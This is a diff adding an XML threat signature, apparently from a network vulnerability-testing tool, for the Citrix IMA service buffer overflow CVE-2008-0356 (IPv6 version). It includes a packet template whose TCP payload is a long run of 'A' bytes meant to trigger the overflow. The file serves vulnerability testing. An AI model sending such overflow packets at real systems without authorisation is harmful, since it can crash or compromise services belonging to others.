@@ -1,0 +1,90 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Citrix Systems Multiple Products IMA Service Buffer Overflow (IPv6 Version)"/>
+    <EngDesc display="true" value="There exists a buffer overflow vulnerability in Independent Management Architecture (IMA) service in Citrix products. The flaw is due to improper handling of user supplied data sent the the Citrix Presentation Server. This issue can be exploited by an unauthenticated attacker to execute arbitrary code with the privileges of Citrix Presentation Server service, which is System by default. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="BUFFER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="Citrix/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Citrix_Systems"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Citrix_Systems_Citrix_Systems_Access_Essentials"/>
+      <item value="Citrix_Systems_Citrix_Systems_Citrix_Presentation_Server"/>
+      <item value="Citrix_Systems_Citrix_Systems_Desktop_Server"/>
+      <item value="Citrix_Systems_Citrix_Systems_MetaFrame_Presentation_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Citrix_Systems_Access_Essentials_1.0"/>
+      <item value="Citrix_Systems_Access_Essentials_1.5"/>
+      <item value="Citrix_Systems_Access_Essentials_2.0"/>
+      <item value="Citrix_Systems_Citrix_Presentation_Server_4.0_for_Microsoft_Windows_2000"/>
+      <item value="Citrix_Systems_Citrix_Presentation_Server_4.0_for_Microsoft_Windows_2003"/>
+      <item value="Citrix_Systems_Citrix_Presentation_Server_4.0_x64_Edition"/>
+      <item value="Citrix_Systems_Citrix_Presentation_Server_4.5_for_Windows_Server_2003"/>
+      <item value="Citrix_Systems_Citrix_Presentation_Server_4.5_for_Windows_Server_2003_Russian_Edition"/>
+      <item value="Citrix_Systems_Citrix_Presentation_Server_4.5_for_Windows_Server_2003_x64_Edition"/>
+      <item value="Citrix_Systems_Desktop_Server_1.0"/>
+      <item value="Citrix_Systems_Desktop_Server_1.0_x64"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20080117-04"/>
+    <CVEID display="true" value="CVE-2008-0356"/>
+    <bugtraqID display="true" value="27329"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="0d3ad7164f7d59d9c0eadfdbe9a2e3d1"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="Medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1236795608"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1204095327" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$destPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="FFFFFFFF41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
